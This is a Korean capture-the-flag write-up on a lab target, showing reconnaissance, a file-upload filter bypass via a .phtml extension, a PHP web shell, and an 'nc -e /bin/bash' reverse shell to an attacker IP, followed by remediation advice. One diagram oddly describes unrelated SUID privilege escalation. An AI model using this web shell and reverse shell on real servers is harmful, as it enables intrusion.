+++
title = "VulnABLE CTF [LUXORA] Write-up: Initial Access (Flag 1)"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "File Upload", "Initial Access", "Reverse Shell", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Initial Access (Flag 1)

## 🎯 챌린지 개요
- **카테고리**: Initial Access & Web Exploitation
- **목표**: 웹 서버의 취약점을 탐색하여 시스템 내부에 진입(Reverse Shell 획득)하고, 첫 번째 플래그(Flag 1)를 찾아라.
- **타겟 IP**: `10.10.10.10` (가상 시나리오)

---

## 🕵️‍♂️ 1. 정보 수집 및 포트 스캐닝 (Reconnaissance)

모의해킹의 첫 단계는 타겟 서버에 어떤 문(Port)이 열려 있는지 확인하는 것입니다. Nmap을 사용하여 서버를 스캔합니다.

### Nmap 스캔 실행
```bash
$ nmap -sC -sV -p- -T4 10.10.10.10
```
- `-sC`: 기본(Default) 취약점 스크립트 스캔
- `-sV`: 포트에서 동작하는 서비스의 버전 정보 확인
- `-p-`: 전체 65535개 포트 스캔

### 🔍 스캔 결과
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to VulnABLE!
```

**[해커의 사고 과정]**
1. 22번 포트(SSH)가 열려있지만, 아직 계정 정보가 없으므로 패스.
2. 80번 포트(HTTP)에 아파치 웹 서버가 돌아가고 있다. 웹 브라우저로 `http://10.10.10.10` 에 접속해보자.

---

## 💥 2. 웹 디렉터리 탐색 및 취약점 식별

### 📊 공격 흐름도 (Attack Flow)

```text
[ Low Priv User ] --(Run SUID Binary / PATH Injection)--> [ Root Shell ]
```


웹 페이지 메인에는 별다른 링크가 없었습니다. `gobuster`를 이용하여 숨겨진 파일이나 디렉터리를 강제로 찾아냅니다.

### Gobuster 디렉터리 브루트포싱
```bash
$ gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

**[탐색 결과]**
```text
/index.php (Status: 200)
/assets (Status: 301)
/upload.php (Status: 200)  <-- 타겟 발견!
```

### 💡 파일 업로드 취약점 분석
브라우저로 `/upload.php` 에 접속해보니, 프로필 사진을 올리는 파일 업로드 폼이 있습니다. 

해커의 1차 목표는 서버에 "내가 만든 실행 파일"을 올리는 것입니다. PHP로 작성된 간단한 쉘(Web Shell)을 만들어 업로드를 시도합니다.

**[shell.php 작성]**
```php
<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>
```

`shell.php` 업로드를 시도했으나, 화면에 **"Error: Only JPG, PNG allowed!"** 라는 에러가 뜨며 차단되었습니다.

---

## 🚀 3. 필터링 우회 및 리버스 셸 획득 (Exploitation)

개발자가 업로드된 파일의 확장자를 검사하고 있습니다. 하지만 이 검사가 허술할 경우 여러 가지 방법으로 우회할 수 있습니다.

### 확장자 필터 우회 (Extension Bypass)
Burp Suite 프록시를 켜서 업로드 요청 패킷을 가로챈 뒤, 파일 이름을 다양하게 변조해 봅니다.

1. `shell.php.jpg` (이중 확장자) -> 실패
2. `shell.PHP` (대소문자 혼용) -> 실패
3. `shell.phtml` (대체 확장자) -> **성공!**

서버의 아파치 설정이 `.phtml` 파일을 PHP 스크립트로 실행하도록 허용하고 있었고, 업로드 필터는 단순히 `.php` 라는 문자열만 막고 있었기 때문입니다.

### 🔗 리버스 셸 (Reverse Shell) 연결
이제 내 컴퓨터(해커의 컴퓨터, IP `10.10.10.99`)의 터미널에서 리스너 포트를 엽니다.

```bash
$ nc -lnvp 4444
```

브라우저에서 방금 올린 `shell.phtml` 경로에 접속하면서, 파라미터로 터미널을 내 컴퓨터로 던지라는 명령어를 전송합니다.
`http://10.10.10.10/uploads/shell.phtml?cmd=nc -e /bin/bash 10.10.10.99 4444`

### 🔍 서버 내부 진입 성공!
내 컴퓨터의 Netcat 화면에 반응이 옵니다.

```bash
$ nc -lnvp 4444
Connection from 10.10.10.10:39842
whoami
www-data
```
성공적으로 서버의 쉘(Shell)을 획득했습니다! 현재 권한은 아파치 웹 서버 계정인 `www-data` 입니다.

---

## 🚩 4. 롸잇업 결론 및 플래그 탐색

권한을 얻었으니 현재 웹 루트 디렉터리를 뒤져서 플래그를 찾습니다.

```bash
$ ls -la /var/www/
-rw-r--r-- 1 www-data www-data   26 Oct 10 12:00 flag1.txt

$ cat /var/www/flag1.txt
THM{w3b_3xpl0it_m4st3r_101}
```

**🔥 획득한 플래그:**
`THM{w3b_3xpl0it_m4st3r_101}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
파일 업로드 기능은 웹 서비스의 가장 큰 아킬레스건입니다.
단순히 확장자를 차단(Blacklist)하는 방식은 해커의 집요한 변종(`php5`, `phtml`, `phar` 등)에 항상 우회당합니다.

* **안전한 파일 업로드 방어 가이드**
1. **화이트리스트 기반 검증**: 오직 `.jpg`, `.png` 등 허용된 확장자만 통과시킵니다.
2. **MIME 타입 및 매직 넘버 검사**: 파일의 껍데기(이름)뿐만 아니라 내부의 실제 파일 헤더(Magic Number)를 읽어 진짜 이미지 파일인지 검증해야 합니다.
3. **업로드 폴더 실행 권한 제거**: 가장 확실한 방법입니다. `/uploads` 폴더에 어떤 파일이 올라오든 아파치/Nginx 서버가 이를 절대로 스크립트(PHP)로 해석하지 않도록, 설정 파일에서 해당 폴더의 실행 권한을 완전히 뺍니다(`php_flag engine off`).